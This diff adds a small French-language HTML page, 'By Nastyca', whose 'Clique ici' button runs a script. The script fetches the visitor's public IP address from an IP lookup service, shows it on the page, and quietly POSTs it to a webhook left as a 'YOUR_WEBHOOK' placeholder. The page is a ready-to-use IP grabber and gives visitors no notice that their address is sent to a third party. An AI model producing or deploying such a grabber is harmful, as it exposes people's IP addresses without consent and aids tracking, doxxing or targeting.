@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>By Nastyca</title>
+</head>
+<body>
+    <button id="getIpButton">Clique ici</button>
+    <p id="ipResult"></p>
+
+    <script>
+        const webhookUrl = 'YOUR_WEBHOOK';
+
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erreur lors de la récupération de l\'IP :', error);
+                return null;
+            }
+        }
+
+        async function sendIPToWebhook(ip) {
+            if (!ip) return;
+
+            const payload = {
+                content: `${ip}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                console.log('IP envoyée au webhook.');
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de l\'IP au webhook :', error);
+            }
+        }
+
+        document.getElementById('getIpButton').addEventListener('click', async () => {
+            const ip = await getPublicIP();
+            document.getElementById('ipResult').textContent = `IP utilisateur : ${ip}`;
+            sendIPToWebhook(ip);
+        });
+    </script>
+</body>
+</html>
